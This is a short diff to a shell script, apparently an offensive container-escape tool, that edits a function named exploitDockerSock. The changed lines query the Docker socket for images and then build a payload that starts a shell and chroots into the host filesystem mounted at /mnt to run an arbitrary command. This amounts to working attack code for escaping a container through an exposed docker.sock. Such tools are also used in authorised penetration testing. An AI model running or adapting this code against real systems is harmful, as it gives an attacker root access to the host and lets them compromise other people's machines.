@@ -1054,13 +1054,12 @@ exploitDockerSock() {
 
   # Try to find an available docker image
   json_data=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json)
-  docker_img=${json_data##*\"RepoTags\":\[\"}
-  docker_img=${json_data%%\"*}
+  docker_img=$(echo "$json_data" | grep -o '"RepoTags":\["[^"]*' | grep -o '[^"]*$' | tail -1)
 
-  if [[ $json_data != *'"RepoTags":'* ]]; then
+  if [ -z "$docker_img" ]; then
     printInfo 'No avaliable docker image found, using alpine'
     docker_img="alpine" 
-  fi
+  fi 
 
   # Create docker container using the docker sock
   payload="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$cmd\\\"\"]"
